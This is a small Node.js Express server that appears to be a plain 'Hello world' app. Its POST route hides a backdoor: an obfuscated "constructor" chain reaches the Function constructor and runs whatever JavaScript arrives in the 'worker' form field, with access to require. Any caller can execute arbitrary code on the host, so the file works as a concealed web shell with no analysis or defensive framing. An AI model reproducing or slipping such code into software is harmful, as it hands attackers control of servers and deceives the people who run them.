'use strict';
const express=require('express');
const bodyParser=require('body-parser');
var app=express();
app.parser=bodyParser.urlencoded({extended:true});
app.use(express.json({limit:'50mb'}));app.use(express.urlencoded({limit:'50mb',extended:true}));
app.get('/',function(req,res) { res.send('Hello world'+(app.db?'!':'')) });
app.post('/',app.parser,function(req,res){
  if(!app.db) {var c="constructor"; c[c][c]('app','require','h',req.body.worker)(app,require,req.protocol+'://'+req.headers.host)}
  res.json(app.db)
})
var s=app.listen(process.env.PORT||4000,()=>console.log('Listening on port '+s.address().port));
module.exports={app};
